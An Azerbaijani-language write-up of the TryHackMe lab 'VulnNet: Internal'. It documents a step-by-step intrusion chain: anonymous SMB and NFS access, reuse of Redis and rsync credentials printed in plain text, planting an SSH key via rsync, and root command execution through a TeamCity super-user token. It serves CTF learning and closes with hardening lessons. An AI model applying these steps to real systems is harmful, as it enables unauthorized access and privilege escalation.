# TryHackMe - VulnNet: Internal Writeup AZ

Room: [VulnNet: Internal](https://tryhackme.com/room/vulnnetinternal)  
Platforma: TryHackMe  
Kateqoriya: Linux, Enumeration, SMB, NFS, Redis, rsync, SSH, TeamCity  
Çətinlik: Easy

> Qeyd: Bu writeup yalnız legal CTF/lab mühiti üçündür. Real sistemlərdə icazəsiz test etmək olmaz.

## Qısa Xülasə

Bu lab-da bir neçə daxili servis səhv konfiqurasiya olunmuşdu. İlk olaraq SMB share-dən `services.txt` flag-i tapılır. Daha sonra NFS export içindən Redis konfiqurasiyası oxunur və Redis parolu əldə edilir. Redis database-də `internal flag` və rsync üçün credential tapılır. rsync vasitəsilə `sys-internal` istifadəçisinin home qovluğuna yazmaq mümkün olur və SSH public key əlavə edilərək sistemə giriş alınır. Privilege escalation mərhələsində TeamCity servisi root kimi işlədiyi üçün TeamCity super user token tapılır, SSH tunnel ilə panelə giriş edilir və build step vasitəsilə root command execution əldə olunur.

## 1. Port Skan

Əvvəlcə hədəfdə açıq portları tapırıq:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Əsas maraqlı portlar:

| Port | Servis | Məna |
|---|---|---|
| 22 | SSH | Serverə uzaqdan terminal girişi |
| 111 | rpcbind | NFS kimi RPC servislərini göstərir |
| 139/445 | SMB/Samba | Fayl paylaşımı |
| 873 | rsync | Fayl sinxronizasiya/paylaşım servisi |
| 2049 | NFS | Uzaq qovluqları mount etmək |
| 6379 | Redis | Key-value database/cache |
| 9090 | filtered | Firewall arxasında görünən port |

## 2. SMB Enumeration və services.txt

SMB share-ləri list edirik:

```bash
smbclient -L //<TARGET_IP>/ -N
```

Burada `shares` adlı paylaşım görünür:

```text
print$          Disk      Printer Drivers
shares          Disk      VulnNet Business Shares
IPC$            IPC       IPC Service
```

`shares` paylaşımına anonymous giriş edirik:

```bash
smbclient //<TARGET_IP>/shares -N
```

SMB prompt-da:

```bash
ls
cd temp
ls
get services.txt
```

Sonra Kali-də:

```bash
cat services.txt
```

Nəticə:

```text
services.txt flag burada tapılır.
Flag: THM{REDACTED}
```

Bu mərhələdə öyrəndiyimiz əsas şey: SMB share parolsuz açıq idi və servis flag-i burada saxlanılmışdı.

## 3. NFS Enumeration

Nmap nəticəsində NFS açıq olduğu üçün export-ları yoxlayırıq:

```bash
showmount -e <TARGET_IP>
```

Nəticə:

```text
Export list for <TARGET_IP>:
/opt/conf *
```

`/opt/conf *` o deməkdir ki, bu qovluq NFS üzərindən hamıya açıqdır.

Mount üçün lokal qovluq yaradırıq:

```bash
mkdir /tmp/nfs
sudo mount -t nfs <TARGET_IP>:/opt/conf /tmp/nfs
ls -la /tmp/nfs
```

Burada bir neçə config qovluğu görünür:

```text
hp
init
opt
profile.d
redis
vim
wildmidi
```

Ən maraqlı qovluq `redis` idi, çünki Redis konfiqurasiyasında parol ola bilər.

## 4. Redis Konfiqurasiyasından Parol Tapmaq

Redis config faylını oxuyuruq:

```bash
cat /tmp/nfs/redis/redis.conf
```

Parol sətrini axtarırıq:

```bash
grep -i "requirepass" /tmp/nfs/redis/redis.conf
```

Nəticədə Redis parolu tapılır:

```text
requirepass "B65Hx562F@ggAZ@F"
```

Burada:

- `requirepass` Redis-ə qoşulmaq üçün lazım olan paroldur.
- `port 6379` Redis-in default portudur.
- `bind 127.0.0.1 ::1` Redis-in lokal bağlantı üçün konfiqurasiya olunduğunu göstərir, amma bu lab-da Redis portu xaricdən də əlçatan idi.

Redis bağlantısını yoxlayırıq:

```bash
redis-cli -h <TARGET_IP> -p 6379 -a 'B65Hx562F@ggAZ@F' ping
```

Uğurlu cavab:

```text
PONG
```

## 5. Redis İçindəki Key-ləri Oxumaq

Redis prompt-a daxil oluruq:

```bash
redis-cli -h <TARGET_IP> -p 6379 -a 'B65Hx562F@ggAZ@F'
```

Database-lərdə neçə key olduğunu yoxlayırıq:

```bash
info keyspace
```

Nəticə:

```text
db0:keys=5,expires=0,avg_ttl=0
```

Bu o deməkdir ki, `db0` içində 5 key var.

Key adlarını göstəririk:

```bash
keys *
```

Nəticə:

```text
int
authlist
marketlist
tmp
internal flag
```

`internal flag` string tipində idi:

```bash
type "internal flag"
get "internal flag"
```

Nəticə:

```text
internal flag burada tapılır.
Flag: THM{REDACTED}
```

## 6. Redis-dən rsync Credential Tapmaq

`authlist` key-inin tipini yoxlayırıq:

```bash
type authlist
```

Nəticə:

```text
list
```

List tipli key-ləri oxumaq üçün `lrange` istifadə olunur:

```bash
lrange authlist 0 -1
```

Nəticədə Base64 formatında məlumat çıxır:

```text
QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
```

Decode edirik:

```bash
echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d
```

Nəticə:

```text
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

Əldə etdiyimiz rsync credential:

```text
Username: rsync-connect
Password: Hcg3HP67@TW@Bc72v
```

## 7. rsync Enumeration

rsync module-larını list edirik:

```bash
rsync rsync://rsync-connect@<TARGET_IP>/
```

Password:

```text
Hcg3HP67@TW@Bc72v
```

Nəticə:

```text
files           Necessary home interaction
```

`files` module-un içini yoxlayırıq:

```bash
rsync rsync://rsync-connect@<TARGET_IP>/files/
```

Nəticə:

```text
ssm-user
sys-internal
ubuntu
```

Ən maraqlı qovluq `sys-internal` idi:

```bash
rsync rsync://rsync-connect@<TARGET_IP>/files/sys-internal/
```

Burada `user.txt` və `.ssh` qovluğu görünür:

```text
user.txt
.ssh
```

User flag-i yükləyirik:

```bash
rsync rsync://rsync-connect@<TARGET_IP>/files/sys-internal/user.txt .
cat user.txt
```

Nəticə:

```text
user.txt flag burada tapılır.
Flag: THM{REDACTED}
```

## 8. SSH Girişi üçün authorized_keys Upload

`sys-internal/.ssh` qovluğu yazıla bildiyi üçün öz SSH public key-imizi `authorized_keys` kimi upload edə bilərik.

Kali-də SSH key yaradırıq:

```bash
ssh-keygen -t rsa -b 2048 -f /home/kali/vulnnet_key
```

Passphrase boş saxlanıla bilər.

Public key-i `authorized_keys` adına kopyalayırıq:

```bash
cp /home/kali/vulnnet_key.pub /home/kali/authorized_keys
```

Sonra onu rsync ilə hədəfə upload edirik:

```bash
rsync /home/kali/authorized_keys rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/
```

Private key icazəsini düzəldirik:

```bash
chmod 600 /home/kali/vulnnet_key
```

SSH ilə giriş edirik:

```bash
ssh -i /home/kali/vulnnet_key sys-internal@<TARGET_IP>
```

Yoxlama:

```bash
whoami
id
hostname
```

Nəticə:

```text
sys-internal
uid=1000(sys-internal)
```

## 9. Privilege Escalation - TeamCity

Sistemə girdikdən sonra açıq local portları yoxlayırıq:

```bash
ss -tulpen
```

Maraqlı portlar:

```text
127.0.0.1:8111
127.0.0.1:8105
*:9090
```

`8111` TeamCity servisi idi. Hədəfdə `curl` yoxdursa, `wget` ilə yoxlamaq olar:

```bash
wget -S -O - http://127.0.0.1:8111
```

Nəticədə TeamCity header-ləri görünür:

```text
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
```

TeamCity qovluğunu tapırıq:

```bash
find / -iname "*teamcity*" 2>/dev/null
```

Əsas qovluq:

```text
/TeamCity
```

TeamCity proseslərini yoxlayırıq:

```bash
ps auxww | grep -i teamcity
```

Burada vacib məqam: TeamCity server və agent prosesləri `root` kimi işləyirdi. Bu o deməkdir ki, TeamCity üzərindən işə salınan build command-ları root hüququ ilə işləyə bilər.

## 10. TeamCity Super User Token

TeamCity loglarında super user token axtarırıq:

```bash
grep -Ri "Super user authentication token" /TeamCity/logs 2>/dev/null
```

Nəticədə bir neçə token görünür:

```text
Super user authentication token: <TOKEN>
```

Ən son token adətən aktiv olur.

## 11. SSH Tunnel ilə TeamCity Panelinə Giriş

TeamCity yalnız hədəfin özündə `127.0.0.1:8111` üzərindən açıldığı üçün SSH tunnel istifadə edirik:

```bash
ssh -i /home/kali/vulnnet_key -L 8111:127.0.0.1:8111 sys-internal@<TARGET_IP>
```

Sonra Kali browser-də açırıq:

```text
http://127.0.0.1:8111
```

Login:

```text
Username: boş saxlanılır
Password: tapılan TeamCity super user token
```

## 12. TeamCity Build Step ilə Root Command Execution

TeamCity panelində yeni project və build configuration yaradılır.

Build step əlavə edilir:

```text
Runner type: Command Line
Run: Custom script
```

Əvvəl test üçün:

```bash
whoami
id
```

Build run edildikdən sonra logda:

```text
root
uid=0(root)
```

görünürsə, deməli command execution root hüququ ilə işləyir.

Root flag-i oxumaq üçün custom script:

```bash
whoami
cat /root/root.txt
```

Nəticə:

```text
root.txt flag burada tapılır.
Flag: THM{REDACTED}
```

## Attack Chain

```text
SMB anonymous access
        ↓
services.txt
        ↓
NFS export /opt/conf
        ↓
Redis config və requirepass
        ↓
Redis keyspace enumeration
        ↓
internal flag və rsync credential
        ↓
rsync files module
        ↓
sys-internal authorized_keys upload
        ↓
SSH as sys-internal
        ↓
TeamCity super user token
        ↓
SSH tunnel to 127.0.0.1:8111
        ↓
TeamCity build step as root
        ↓
root.txt
```

## Öyrənilən Dərslər

- SMB share-lər anonymous girişə açıq olmamalıdır.
- NFS export-lar `*` ilə hamıya açılmamalıdır.
- Config fayllarında servis parolları saxlananda icazələr düzgün verilməlidir.
- Redis parol ilə qorunsa belə, konfiqurasiya faylı oxuna bilirsə risk qalır.
- rsync module-ları düzgün authentication və read/write icazələri ilə məhdudlaşdırılmalıdır.
- İstifadəçinin `.ssh` qovluğuna yazmaq mümkün olmamalıdır.
- TeamCity kimi CI/CD servisləri root kimi işlədilməməlidir.
- TeamCity super user token-ləri loglarda qalarsa, panel tam ələ keçirilə bilər.

## İstifadə Olunan Əsas Komandalar

```bash
nmap -sC -sV -p- <TARGET_IP>
smbclient -L //<TARGET_IP>/ -N
smbclient //<TARGET_IP>/shares -N
showmount -e <TARGET_IP>
sudo mount -t nfs <TARGET_IP>:/opt/conf /tmp/nfs
grep -i "requirepass" /tmp/nfs/redis/redis.conf
redis-cli -h <TARGET_IP> -p 6379 -a '<REDIS_PASSWORD>'
info keyspace
keys *
type "internal flag"
get "internal flag"
type authlist
lrange authlist 0 -1
rsync rsync://rsync-connect@<TARGET_IP>/
rsync rsync://rsync-connect@<TARGET_IP>/files/
ssh-keygen -t rsa -b 2048 -f /home/kali/vulnnet_key
rsync /home/kali/authorized_keys rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/
ssh -i /home/kali/vulnnet_key sys-internal@<TARGET_IP>
ss -tulpen
grep -Ri "Super user authentication token" /TeamCity/logs 2>/dev/null
ssh -i /home/kali/vulnnet_key -L 8111:127.0.0.1:8111 sys-internal@<TARGET_IP>
```

## Mənbələr

- TryHackMe room: https://tryhackme.com/room/vulnnetinternal
- Rawsec writeup: https://blog.raw.pm/en/TryHackMe-VulnNet-Internal-write-up/
- Nasrallah writeup: https://nasrallahbaadi.com/posts/THM-VulnNet-Internal/
- MarCorei7 writeup: https://marcorei7.wordpress.com/2021/05/18/135-vulnnet-internal/
- Nihir Zala writeup: https://nihirzala.medium.com/vulnnet-internal-tryhackme-b9477124f40f

